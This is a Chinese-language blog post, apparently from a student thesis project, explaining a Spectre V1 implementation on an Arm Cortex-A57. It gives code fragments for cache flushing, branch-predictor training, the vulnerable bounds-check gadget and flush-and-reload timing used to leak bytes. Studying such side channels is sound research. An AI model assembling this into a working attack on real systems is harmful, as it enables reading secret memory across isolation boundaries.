---
layout: post
title: Spectre on Arm cortex A57
categories: [Microarchitecture vulnerability]
description: Cache
keywords: Microarchitecture
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

# Spectre V1 on Arm
本文主要讨论spectre v1在Arm Cortex 57上的实现．具体的原理可以查看论文　https://spectreattack.com/spectre.pdf.
Spectre 的原理不复杂, 但是具体的实现不太好描述 (本人表达能力实在很有限, 高中语文考试基本都是倒数, 如果你不巧看到这个文章看的很糊涂, 可以发邮件问我
, 但是有些问题我也不会). 全部的代码会在毕业设计结束之后开源.
## Spectre V1

最基本的就是，假如我将`array1_size` flush, 那么 CPU 需要一些时间访问物理内存获取变量的值.
这时候很多处理器会触发 out of order execution 乱序执行跳过这个分支判断. CPU 中一般存在一个缓存存储一些分支判断的结果,
在跳过这个判断的时候,会参考这个缓存, 如果之前几次的分支判断都是 True, 那么在乱序执行中, 这个分支就会默认为通过, 从而执行
分支内部的代码. 
```
if (x < array1_size)
    y = array2[array1[x] * 4096];
```
假设现在我们通过一些方法使得分支预测缓存里对于这个判断的结果都是通过, 但是传如一个 `x` 的值大于 `array_size`, 此时程序可以访问一个超出
`array2` 范围的位置, 并且用获取的值访问 `reloadbuffer` (`array1`). 这时候我们可以通过 flush and reload 测信道获取这个值.

## Spectre V1 Arm cortex A57 implementation
有一个开源的仓库目前实现了 Arm 上的Spectre V1攻击, 我的实现中利用了他的分支训练思路, https://github.com/V-E-O/PoC/tree/master/CVE-2017-5753
大致思路如下:

首先我们通过 flush and reload 计算出 cache hit 和 cache miss 的分界是多少.
```
CACHE_THRESHOLD = measure_latency();
```

随后我们开始训练分支并且泄漏我们想要泄漏的字符串. 先将我们的 `reloadbuffer` 从缓存中 flush 掉. 最好在每一次内存操作的时候添加一个内存屏障 `barrier`,
从而保证我们操作内存的时候, 不会因为乱序执行导致 flush 没有结束的时候后面的指令就开始执行. 

```
for (int i = 0; i < 256; i++)
	cacheflush(&reloadbuffer[i * STRIDE]); 
```
```
static inline __attribute__((always_inline)) void barrier(void){
  asm volatile ("DMB SY ");
}
```

我们将我们想要泄漏的字符串大小的值同时也 flush 出缓存, 导致分支判断变慢.
```
cacheflush(&array1_size);
```

这时候我们开始训练分支预测, 将分支预测训练为通过. 只有在 `j` 可以整除 `10` 的时候, `probe_addr` 会是 `target` 也就是我们想要泄漏的地址.
其他时候 `j` 都是 `train_index`, `train_index` 是在 `array1_size` 范围当中的. 每一轮最后 `probe_addr` 会变成 `target` (不在 `array1` 范围中).


```
probe_addr = ((j % 10) - 1) & ~0xFFFF; 
probe_addr = (probe_addr | (probe_addr >> 16)); 
probe_addr = train_index ^ (probe_addr & (target ^ train_index));
cacheflush(&array1_size);   // flush again (I dont know why)
spectre_v1(&probe_addr);
```
```
void spectre_v1(size_t *index) {
	if (*index < array1_size)
	{
		pick = reloadbuffer[fake_buffer[*index] * STRIDE];
	}
}
```

最后我们进行 `reload` 操作, 这里我们用了 `index = ((i * 167) + 13) & 255;` 打乱的访问顺序, 防止 prefetcher 干扰.
假如我们访问一个位置的时间少于我们计算出的 `CACHE_THRESHOLD`, 说明这时候出现了 cache hit, 也就是 `spectre_v1` 函数中访问过了
这个位置. 那么这个值就是我们要泄漏的一个字节. 
```
for (int i = 0; i < 256; i++)
{
	index = ((i * 167) + 13) & 255;
	measured_clock = timed_read(&reloadbuffer[index * STRIDE], &start, &end);
	if (measured_clock <= CACHE_THRESHOLD && index != fake_buffer[tries % array1_size])
		results[index]++; 
}
```

有一些比较重要的汇编内联函数大概是这样:
```
static inline __attribute__((always_inline)) void cacheflush(void* address)
{
  	asm volatile ("DC CIVAC, %0" :: "r"(address));
  	asm volatile ("DSB ISH");
  	asm volatile ("ISB");
}

static inline __attribute__((always_inline)) void barrier(void){
  	asm volatile ("DMB SY ");
}

//#include <time.h>
void clock_init(struct timespec *start){
  	clock_gettime(CLOCK_REALTIME, start);
}

void clock_end(struct timespec *end){
  	clock_gettime(CLOCK_REALTIME, end);
}

uint64_t get_clock(struct timespec start, struct timespec end){
  	return BILLION * (end.tv_sec - start.tv_sec) + end.tv_nsec - start.tv_nsec;
}

static uint64_t timed_read(volatile uint8_t *addr, struct timespec *start, struct timespec *end) {
	volatile uint8_t pick = 0; 
  	clock_init(start);
	pick = *addr;
  	clock_end(end);
	barrier();
  	return get_clock(*start, *end);
}
```

